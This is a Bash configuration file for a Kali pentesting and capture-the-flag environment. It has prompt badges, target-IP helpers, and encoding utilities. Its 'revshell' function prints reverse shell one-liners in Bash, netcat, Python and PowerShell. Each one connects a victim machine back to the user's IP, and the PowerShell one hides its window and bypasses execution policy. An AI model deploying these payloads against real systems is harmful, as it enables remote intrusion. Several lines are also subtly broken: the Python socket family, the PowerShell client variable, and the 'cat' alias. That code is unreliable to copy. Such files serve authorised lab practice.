# ==============================================================================
# 🛡️ BASH CONFIGURATION - KALI CYBER ENVIRONMENT
# ==============================================================================

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# History settings
HISTCONTROL=ignoreboth
shopt -s histappend
HISTSIZE=50000
HISTFILESIZE=50000
shopt -s checkwinsize

# Make less more friendly for non-text input files
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# Color prompt support
if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
    color_prompt=yes
else
    color_prompt=
fi

# ==============================================================================
# CYBER PROMPT WITH TARGET & VPN BADGES
# ==============================================================================
prompt_git() {
    local branch=$(git symbolic-ref --short HEAD 2>/dev/null)
    if [ -n "$branch" ]; then
        local dirty=$(git status --porcelain 2>/dev/null | tail -n 1)
        if [ -n "$dirty" ]; then
            echo " \[\033[1;33m\](git:$branch*)\[\033[00m\]"
        else
            echo " \[\033[1;33m\](git:$branch)\[\033[00m\]"
        fi
    fi
}

prompt_target_status() {
    local target_file="$HOME/.config/i3/target"
    if [ -f "$target_file" ]; then
        local target=$(head -n 1 "$target_file" 2>/dev/null | xargs)
        if [ -n "$target" ]; then
            echo "\[\033[1;31m\][🎯 $target]\[\033[00m\] "
        fi
    fi
}

prompt_vpn_status() {
    local vpn_ip=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
    if [ -z "$vpn_ip" ]; then
        vpn_ip=$(ip -4 addr show wg0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
    fi
    if [ -n "$vpn_ip" ]; then
        echo "\[\033[1;32m\][🛡️ $vpn_ip]\[\033[00m\] "
    fi
}

set_bash_prompt() {
    local exit_code="$?"
    local status_symbol=""
    if [ "$exit_code" -eq 0 ]; then
        status_symbol="\[\033[1;36m\]└─\$\[\033[00m\] "
    else
        status_symbol="\[\033[1;31m\]└─[$exit_code]✘\$\[\033[00m\] "
    fi

    PS1="$(prompt_target_status)$(prompt_vpn_status)\[\033[1;36m\]┌──(\[\033[1;34m\]\u㉿\h\[\033[1;36m\])-[\[\033[1;37m\]\w\[\033[1;36m\]]\[\033[00m\]$(prompt_git)\n${status_symbol}"
}
PROMPT_COMMAND=set_bash_prompt

# ==============================================================================
# WELCOME BANNER ON NEW TERMINALS
# ==============================================================================
if [ -t 1 ]; then
    _vpn_ip=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
    [ -z "$_vpn_ip" ] && _vpn_ip=$(ip -4 addr show wg0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
    _tgt_ip=$(head -n 1 "$HOME/.config/i3/target" 2>/dev/null | xargs)

    echo ""
    echo -e "\033[1;36m  ⚡ KALI CYBER ENVIRONMENT \033[0;90m| \033[0;32mSession: $(whoami)@$(hostname)\033[0m"
    echo -e "\033[0;90m  ─────────────────────────────────────────────────────────\033[0m"
    echo -e "\033[0;33m  • Target:\033[0m \033[1;31m${_tgt_ip:-No Target Set}\033[0m  \033[0;90m|\033[0m  \033[0;33m• VPN:\033[0m \033[1;32m${_vpn_ip:-No VPN Active}\033[0m"
    echo -e "\033[0;90m  • Shortcuts: Mod+Return (Term) | Mod+u (Scratch) | Mod+d (Rofi)\033[0m"
    echo ""
fi

# ==============================================================================
# OFFENSIVE PENTESTING FUNCTIONS & ALIASES
# ==============================================================================

# Target IP Management
settar() {
    local ip="$1"
    if [ -z "$ip" ]; then
        read -p "Enter Target IP: " ip
    fi
    if [ -n "$ip" ]; then
        echo "$ip" > ~/.config/i3/target
        if command -v xclip >/dev/null 2>&1; then
            echo -n "$ip" | xclip -selection clipboard
        fi
        echo -e "\033[0;32m[+] Target set and copied to clipboard:\033[0m $ip"
        pkill -RTMIN+1 i3blocks 2>/dev/null || true
    fi
}

cleartar() {
    > ~/.config/i3/target
    echo -e "\033[1;33m[!] Target cleared.\033[0m"
    pkill -RTMIN+1 i3blocks 2>/dev/null || true
}

cptar() {
    local target=$(cat ~/.config/i3/target 2>/dev/null | xargs)
    if [ -n "$target" ]; then
        echo -n "$target" | xclip -selection clipboard 2>/dev/null
        echo -e "\033[0;32m[+] Copied to clipboard:\033[0m $target"
    else
        echo -e "\033[0;31m[-] No active Target set.\033[0m"
    fi
}

target() {
    cat ~/.config/i3/target 2>/dev/null || echo "No Target set"
}

# VPN IP Management
cpvpn() {
    local vpn_ip=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
    if [ -z "$vpn_ip" ]; then
        vpn_ip=$(ip -4 addr show wg0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
    fi
    if [ -n "$vpn_ip" ]; then
        echo -n "$vpn_ip" | xclip -selection clipboard 2>/dev/null
        echo -e "\033[0;32m[+] VPN IP copied:\033[0m $vpn_ip"
    else
        echo -e "\033[0;31m[-] No active VPN connection.\033[0m"
    fi
}

vpn() {
    ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || \
    ip -4 addr show wg0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' || \
    echo "No VPN connected"
}

myip() {
    echo -n "Local IP:  " && ip route get 1.1.1.1 2>/dev/null | awk '{print $7}'
    echo -n "VPN IP:    " && (vpn)
    echo -n "Public IP: " && (curl -s --max-time 2 ifconfig.me || echo "Unavailable")
}

# CTF Folder Structure Generator
mktarget() {
    if [ -z "$1" ]; then
        echo "Usage: mktarget <MachineName>"
        return 1
    fi
    local name="$1"
    mkdir -p "$name"/{nmap,exploits,content,loot,scripts}
    cd "$name" || return
    echo -e "\033[0;32m[+] Directory structure created for:\033[0m $name"
    ls -la
}

# Quick Python HTTP Server
http-server() {
    local port="${1:-80}"
    echo -e "\033[0;32m[+] HTTP Server running on port $port (Ctrl+C to stop)...\033[0m"
    python3 -m http.server "$port"
}

# Listening Ports Viewer
ports() {
    echo -e "\033[1;36m[+] Active listening sockets:\033[0m"
    sudo ss -tulpn | grep LISTEN
}

# Quick Encoding & Decoding
b64e() {
    if [ -z "$1" ]; then
        read -r input
        echo -n "$input" | base64
    else
        echo -n "$1" | base64
    fi
}

b64d() {
    if [ -z "$1" ]; then
        read -r input
        echo -n "$input" | base64 -d
    else
        echo -n "$1" | base64 -d
    fi
    echo ""
}

urle() {
    python3 -c "import urllib.parse, sys; print(urllib.parse.quote(sys.argv[1] if len(sys.argv) > 1 else sys.stdin.read().strip()))" "$1"
}

urld() {
    python3 -c "import urllib.parse, sys; print(urllib.parse.unquote(sys.argv[1] if len(sys.argv) > 1 else sys.stdin.read().strip()))" "$1"
}

# Quick Reverse Shell Generator
revshell() {
    local ip="${1:-$(vpn)}"
    local port="${2:-4444}"
    local type="${3:-bash}"

    if [ "$ip" = "No VPN connected" ] || [ -z "$ip" ]; then
        echo -e "\033[0;31m[-] Please specify an IP: revshell <IP> [PORT] [TYPE]\033[0m"
        return 1
    fi

    echo -e "\033[1;36m=== Reverse Shell Payloads ($ip:$port) ===\033[0m\n"
    case "$type" in
        bash)
            echo -e "\033[1;33mBash TCP:\033[0m"
            echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
            echo ""
            echo -e "\033[1;33mBash Readline:\033[0m"
            echo "exec 5<>/dev/tcp/$ip/$port;cat <&5 | while read line; do \$line 2>&5 >&5; done"
            ;;
        nc|netcat)
            echo -e "\033[1;33mNetcat Traditional:\033[0m"
            echo "nc -e /bin/bash $ip $port"
            echo ""
            echo -e "\033[1;33mNetcat OpenBSD (mkfifo):\033[0m"
            echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
            ;;
        python|python3)
            echo -e "\033[1;33mPython 3:\033[0m"
            echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_PACKET,socket.SOCK_STREAM);s.connect((\"$ip\",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")'"
            ;;
        powershell|ps)
            echo -e "\033[1;33mPowerShell Base64:\033[0m"
            echo "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$ip\",$port);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
            ;;
        *)
            echo "bash -i >& /dev/tcp/$ip/$port 0>&1"
            ;;
    esac
}

# Enhanced Aliases
alias ls='ls --color=auto'
alias ll='ls -la --color=auto'
alias la='ls -A --color=auto'
alias l='ls -CF --color=auto'
alias grep='grep --color=auto'
alias df='df -h'
alias free='free -m'
alias cat='batcat 2>/dev/null || bat 2>/dev/null || cat'

# Enable bash completion if available
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
